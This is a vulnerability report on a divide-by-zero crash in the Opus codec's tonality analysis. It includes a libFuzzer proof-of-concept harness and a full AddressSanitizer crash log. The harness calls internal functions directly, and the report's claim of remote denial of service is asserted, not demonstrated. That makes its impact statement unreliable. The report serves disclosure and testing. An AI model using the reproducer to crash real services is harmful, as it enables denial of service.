# Vulnerability Report: Floating Point Exception (Division by Zero) in Opus Tonality Analysis

## 1. Vulnerability Description

A **Floating Point Exception (FPE)** vulnerability was identified in the **Opus Audio Codec** within the `tonality_get_info` function of the tonality analysis component. The issue stems from an incomplete initialization/reset logic in `tonality_analysis_reset`, which leaves critical state variables like `prob_count` at a zero value. When these variables are subsequently used as divisors in mathematical operations within `tonality_get_info`, the process triggers a division-by-zero exception, leading to a crash and potential Denial of Service (DoS).

## 2. Technical Analysis

### Root Cause

The vulnerability resides in `src/analysis.c`. The `TonalityAnalysisState` structure is partially cleared during a reset, but operational constants and counters are not explicitly set to safe starting values.

**Code Snippet: `src/analysis.c` - `tonality_analysis_reset**`

```c
void tonality_analysis_reset(TonalityAnalysisState *tonal)
{
  char *start = (char*)&tonal->TONALITY_ANALYSIS_RESET_START;
  // This clears memory to 0, but does not perform logical initialization
  OPUS_CLEAR(start, sizeof(TonalityAnalysisState) - (start - (char*)tonal));
}

```

**Code Snippet: `src/analysis.c` - `tonality_get_info` (Approx. Line 253)**
The crash occurs during the calculation of music probability:

```c
// VULNERABLE LINE
info_out->music_prob = prob_avg / prob_count; 

```

In scenarios where the fuzzer or an application triggers a reset followed immediately by a request for info, `prob_count` remains `0.0f` (due to the `OPUS_CLEAR`). The logic lacks a guard to ensure `prob_count` is non-zero before performing the division.

### Crash Trace

* **Exception Type**: `AddressSanitizer: FPE on unknown address`
* **Location**: `src/analysis.c:253` in `tonality_get_info`
* **Component**: Opus Analysis Toolset

## 3. Impact

* **Vulnerability Type**: CWE-369 (Divide By Zero)
* **Attack Vector**: An attacker can trigger this state by providing specific input sequences that force a codec reset or by exploiting improper API usage patterns where analysis info is requested before sufficient data has been processed to increment internal counters.
* **Impact**: Immediate process termination (DoS). In a multi-tenant environment or a high-availability VoIP gateway, this can result in service interruption.

## 4. Proof of Concept (PoC)
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "analysis.h"

int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
    if (Size < 4) {
        return 0;
    }

    opus_int32 Fs;
    memcpy(&Fs, Data, sizeof(Fs));

    int frame_length = 480;
    if (frame_length <= 0) {
        return 0;
    }

    TonalityAnalysisState tonal;
    tonality_analysis_init(&tonal, Fs);
    tonality_analysis_reset(&tonal);

    AnalysisInfo info;
    tonality_get_info(&tonal, &info, frame_length);

    return 0;
}
```
## 5. Crash Output
```
INFO:__main__:Running: docker run --privileged --shm-size=2g --platform linux/amd64 --rm -e FUZZING_ENGINE=libfuzzer -e SANITIZER=address -e RUN_FUZZER_MODE=interactive -e HELPER=True -v /data/huangzikang/driver_test_data/opus/corpus/tonality_analysis_init-output-2-regen1/opus_repacketizer_fuzzer_fixed:/tmp/opus_repacketizer_fuzzer_fixed_corpus -v /data/huangzikang/uploadfile/oss-fuzz/build/out/tonality_analysis_init-output-2-regen1:/out -t gcr.io/oss-fuzz-base/base-runner run_fuzzer opus_repacketizer_fuzzer_fixed -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0.
vm.mmap_rnd_bits = 28
rm: cannot remove '/tmp/opus_repacketizer_fuzzer_fixed_corpus': Device or resource busy
Using seed corpus: opus_repacketizer_fuzzer_fixed_seed_corpus.zip
/out/opus_repacketizer_fuzzer_fixed -rss_limit_mb=2560 -timeout=25 -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0 /tmp/opus_repacketizer_fuzzer_fixed_corpus < /dev/null
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 1140316585
INFO: Loaded 1 modules   (528 inline 8-bit counters): 528 [0x55b95a4a5090, 0x55b95a4a52a0), 
INFO: Loaded 1 PC tables (528 PCs): 528 [0x55b95a4a52a0,0x55b95a4a73a0), 
INFO:       24 files found in /tmp/opus_repacketizer_fuzzer_fixed_corpus
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 1048576 bytes
INFO: seed corpus: files: 24 min: 56702b max: 6145920b total: 65091562b rss: 32Mb
AddressSanitizer:DEADLYSIGNAL
=================================================================
==13==ERROR: AddressSanitizer: FPE on unknown address 0x55b95a4328a9 (pc 0x55b95a4328a9 bp 0x7ffdcc737830 sp 0x7ffdcc7377a0 T0)
SCARINESS: 10 (signal)
    #0 0x55b95a4328a9 in tonality_get_info /src/opus/src/analysis.c:253:31
    #1 0x55b95a43260d in LLVMFuzzerTestOneInput /src/opus/tests/opus_repacketizer_fuzzer.c:26:5
    #2 0x55b95a2e9330 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #3 0x55b95a2e8b55 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool, bool*) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:516:7
    #4 0x55b95a2eaae2 in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:829:7
    #5 0x55b95a2eadd2 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:867:3
    #6 0x55b95a2d9f0b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:914:6
    #7 0x55b95a3052e2 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #8 0x7f49d9ef1082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #9 0x55b95a2cc78d in _start (/out/opus_repacketizer_fuzzer_fixed+0x3f78d)

DEDUP_TOKEN: tonality_get_info--LLVMFuzzerTestOneInput--fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long)
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: FPE /src/opus/src/analysis.c:253:31 in tonality_get_info
==13==ABORTING
MS: 0 ; base unit: 0000000000000000000000000000000000000000
artifact_prefix='./'; Test unit written to ./crash-8959b69d6f51771e4264e08f27e4407bf6e77a1f
stat::number_of_executed_units: 14
stat::average_exec_per_sec:     0
stat::new_units_added:          0
stat::slowest_unit_time_sec:    0
stat::peak_rss_mb:              47
```